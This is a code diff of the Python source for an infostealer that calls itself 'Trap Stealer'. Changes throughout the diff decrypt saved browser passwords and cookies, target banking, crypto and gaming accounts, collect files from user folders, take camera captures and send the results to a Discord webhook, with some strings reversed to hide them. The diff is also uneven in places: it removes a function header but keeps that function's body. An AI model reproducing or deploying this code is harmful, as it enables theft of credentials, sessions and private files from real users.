@@ -673,42 +673,67 @@ def writeforfile(data, name):
             if line[0] != '':
                 f.write(f"{line}\n")
 
+                
 paswWords = []
 Passw = []
 
 def getPassw(path, arg):
+    def CryptUnprotectData(encrypted_bytes, entropy=b''):
+        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
+        buffer_entropy = c_buffer(entropy, len(entropy))
+        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
+        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
+        blob_out = DATA_BLOB()
+
+        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
+            return GetData(blob_out)
+
+    def DecryptValue(buff, master_key=None):
+        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
+        if starts in ['v10', 'v11']:
+            iv = buff[3:15]
+            payload = buff[15:]
+            cipher = AES.new(master_key, AES.MODE_GCM, iv)
+            decrypted_pass = cipher.decrypt(payload)
+            decrypted_pass = decrypted_pass[:-16].decode()
+            return decrypted_pass
+        
     global Passw, PasswCount
-    PasswCount += 1
-    if not exists(path):
-        return
-    pathC = path + arg + "/Local Data"
-    if not exists(pathC):
-        return
-    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8)) + ".db"
+    if not os.path.exists(path): return
+
+    pathC = path + arg + "/Login Data"
+    if os.stat(pathC).st_size == 0: return
+
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+
     shutil.copy2(pathC, tempfold)
-    conn = sqlite3.connect(tempfold)
+    conn = sql_connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT action_url, username_value, value FROM logins;")
+    cursor.execute(f"SELECT action_url, username_value, {pas[::-1]}_value FROM logins;")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
     os.remove(tempfold)
 
     pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f:
-        local_state = json_loads(f.read())
-    master_key = b64decode(local_state['os_crypt']['encrypted_key'])[5:]
-    keyword = ['mail', 'coinbase', 'sellix', 'gmail', 'steam', 'discord', 'riotgames', 'youtube', 'instagram', 'tiktok', 'twitter', 'facebook', 'card', 'epicgames', 'spotify', 'yahoo', 'roblox', 'twitch', 'minecraft', 'bank', 'paypal', 'origin', 'amazon', 'ebay', 'aliexpress', 'playstation', 'hbo', 'xbox', 'buy', 'sell', 'binance', 'hotmail', 'outlook', 'crunchyroll', 'telegram', 'pornhub', 'disney', 'expressvpn', 'crypto', 'uber', 'netflix']
-    for row in data:
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
+    master_key = CryptUnprotectData(master_key[5:])
+    keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)']
+    for row in data: 
         if row[0] != '':
             for wa in keyword:
+                old = wa
+                if "https" in wa:
+                    tmp = wa
+                    wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
-                    paswWords.append(wa)
-            Passw.append(f"URL: {row[0]} | Username: {row[1]} | Password: {DecryptValue(row[2], master_key)}")
-
+                    if not old in paswWords: paswWords.append(old)
+            Passw.append(f"URL: {row[0]} | Username: {row[1]} | {pas[::-1]}: {DecryptValue(row[2], master_key)}")
+            PasswCount += 1
     writeforfile(Passw, 'passw')
-
-
+    
 def getinfo():
     try:
         sysinfo = systemInfo()
@@ -789,58 +814,64 @@ def upload_files_to_discord():
     downloads_path = os.path.expanduser("~/Downloads")
     documents_path = os.path.expanduser("~/Documents")
     pictures_path = os.path.expanduser("~/Pictures")
+    music_path = os.path.expanduser("~/Music")
+    videos_path = os.path.expanduser("~/Videos")
+    applications_path = os.path.expanduser("~/Applications")
+    public_path = os.path.expanduser("~/Public")
+    templates_path = os.path.expanduser("~/Templates")
+    downloads_documents_path = os.path.join(downloads_path, "Documents")
+    downloads_pictures_path = os.path.join(downloads_path, "Pictures")
 
     file_paths = []
-    try:
-        for path in [desktop_path, downloads_path, documents_path, pictures_path]:
-            for file in os.listdir(path):
-                if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
-                    file_path = os.path.join(path, file) 
-                    file_paths.append(file_path)
 
-        urls = []
-    
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            futures = []
-            try:
-                for file_path in file_paths:
-                    futures.append(executor.submit(upload_file, file_path))
-                for future, file_path in zip(futures, file_paths):
-                    url = future.result()
-                    if url:
-                        urls.append((os.path.basename(file_path), url))
-                    else:
-                        pass
-            finally:
-                executor.shutdown(wait=True)
-    
-    
-        if urls:
-            embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
-    
-            data = {
-                "username": "Trap Stealer",
-                "content": "",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-                "embeds": [
-                    {
-                        "title": "🍪 Trap Stealer Files",
-                        "description": "New files have been uploaded:",
-                        "color": 0xffb6c1,
-                        "fields": embed_fields,
-                        "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                        },
-                        "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                        }
+    for path in [desktop_path, downloads_path, documents_path, pictures_path]:
+        for file in os.listdir(path):
+            if file.endswith(extension) and any(keyword[::-1] in file for keyword in keywords):
+                file_path = os.path.join(path, file) 
+                file_paths.append(file_path)
+
+    urls = []
+
+    with concurrent.futures.ThreadPoolExecutor() as executor:
+        futures = []
+        try:
+            for file_path in file_paths:
+                futures.append(executor.submit(upload_file, file_path))
+            for future, file_path in zip(futures, file_paths):
+                url = future.result()
+                if url:
+                    urls.append((os.path.basename(file_path), url))
+                else:
+                    pass
+        finally:
+            executor.shutdown(wait=True)
+
+
+    if urls:
+        embed_fields = [{"name": f"{i+1}. {file}", "value": f"[Click here to download]({url})"} for i, (file, url) in enumerate(urls)]
+
+        data = {
+            "username": "Trap Stealer",
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": "🍪 Trap Stealer Files",
+                    "description": "New files have been uploaded:",
+                    "color": 0xffb6c1,
+                    "fields": embed_fields,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     }
-                ]
-            }
-    
-            LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
-    except:pass
+                }
+            ]
+        }
+
+        LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
 def ZipTelegram(path, arg, procc):
     global OtherZip
     pathC = path
@@ -1008,7 +1039,6 @@ def paaz():
         }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
-def cooks():
     try:
         file = os.getenv("TEMP") + f"\wpcook.txt"
         filename = "wpcook.txt"
@@ -1017,27 +1047,28 @@ def cooks():
         embed_fields = [{"name": f"{filename}", "value": f"[Click here to download]({a})"}]
         pas = 'eikooC'
         data = {
-                "username": "Trap Stealer",
-                "content": "",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
-                "embeds": [
-                    {
-                        "title": f"🍪 Trap Stealer {pas[::-1]}",
-                        "description": f"Number of {pas[::-1]} : {coonum}",
-                        "color": 0xffb6c1,
-                        "fields": embed_fields,
-                        "thumbnail": {
-                            "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
-                        },
-                        "footer": {
-                            "text": "Trap Stealer | https://github.com/TheCuteOwl",
-                            "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
-                        }
+            "username": "Trap Stealer",
+            "content": "",
+            "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png",
+            "embeds": [
+                {
+                    "title": f"🍪 Trap Stealer {pas[::-1]}",
+                    "description": f"Number of {pas[::-1]} : {coonum}",
+                    "color": 0xffb6c1,
+                    "fields": embed_fields,
+                    "thumbnail": {
+                        "url": "https://media.tenor.com/q-2V2y9EbkAAAAAC/felix-felix-argyle.gif"
+                    },
+                    "footer": {
+                        "text": "Trap Stealer | https://github.com/TheCuteOwl",
+                        "icon_url": "https://cdn3.emoji.gg/emojis/3304_astolfobean.png"
                     }
-                ]
-            }
+                }
+            ]
+        }
         LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)
     except:pass
+
 coonum = 0
 def getcook():
     global coonum
@@ -1065,26 +1096,40 @@ def getcook():
     profiles=['Default','Profile 1','Profile 2','Profile 3','Profile 4','Profile 5']
 
     cookies=[]
-
     for path in browsers.values():
-        if not os.path.exists(path):continue
-        master_key=_z1v7s1(f'{path}\\Local State')
-        if not master_key:continue
-        for profile in profiles:
-            cookie_db=f'{path}\\{profile}\\Network\\Cookies'
-            if not os.path.exists(cookie_db):continue
-            try:
-                conn=sqlite3.connect(cookie_db)
-                cursor=conn.cursor()
-                cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
-                for row in cursor.fetchall():
-                    coonum+=1
-                    if all(row[:4]):
-                        cookie=_x2a6f6(row[3],master_key)
-                        cookies.append({'host':row[0],'name':row[1],'path':row[2],'value':cookie,'expires':row[4]})
-                conn.close()
-            except:pass
-    writeforfile(cookies, 'cook')
+        try:
+            if not os.path.exists(path):continue
+            master_key=_z1v7s1(f'{path}\\Local State')
+            if not master_key:continue
+            for profile in profiles:
+                cookie_db = f'{path}\\{profile}\\Network\\Cookies'
+                if not os.path.exists(cookie_db):
+                    continue
+                path2 = os.getenv("TEMP") + f"\wpcook.txt"
+                try:
+                    conn = sqlite3.connect(cookie_db)
+                    cursor = conn.cursor()
+                    cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
+                    for row in cursor.fetchall():
+                        coonum += 1
+                        if all(row[:4]):
+                            cookie = _x2a6f6(row[3], master_key)
+                            cookies.append({'host': row[0], 'name': row[1], 'path': row[2], 'value': cookie, 'expires': row[4]})
+                    conn.close()
+                    
+                    with open(path2, mode='a', encoding='utf-8') as f:
+                        f.write("Trap Stealer\n")
+                        for cookie_entry in cookies:
+                            f.write(str(cookie_entry) + "\n")
+                except Exception as e:
+                    pass
+                except:
+                    conn.close()
+                    pass
+        except:
+            pass
+            
+
             
 def GatherZips(paths1, paths2, paths3):
     thttht = []
@@ -1175,24 +1220,27 @@ def GatherAll():
         [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
     ]
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
-
-    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
-    
-    az = threading.Thread(target=upload_files_to_discord)
-    az.start()
-    Threadlist.append(az)
-    a = threading.Thread(target=getinfo)
-    a.start()
-    Threadlist.append(a)
+    aa = []
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
+        aa.append(us)
     else:
         pass
     if FakeWebhook == True:
         wb = threading.Thread(target=webhook_tools)
         wb.start()
-    else:pass
+        aa.append(wb)
+    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
+    
+    az = threading.Thread(target=upload_files_to_discord)
+    az.start()
+    Threadlist.append(az)
+
+    a = threading.Thread(target=getinfo)
+    a.start()
+    Threadlist.append(a)
+    
         
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
@@ -1211,6 +1259,7 @@ def GatherAll():
     coo = threading.Thread(target=getcook)
     coo.start()
     threadlist2.append(coo)
+
     if Startup == True:
         sta = threading.Thread(target=startup)
         sta.start()
@@ -1228,13 +1277,13 @@ def GatherAll():
     paz.start()
     Threadlist.append(paz)
     
-    coss = threading.Thread(target=cooks)
-    coss.start()
-    Threadlist.append(coss)
-    
     cam = threading.Thread(target=Camera_get)
     cam.start()
     Threadlist.append(cam)
     for thread in Threadlist:
         thread.join()
+    for thread in aa:
+        thread.join() 
+        
+
 GatherAll() 
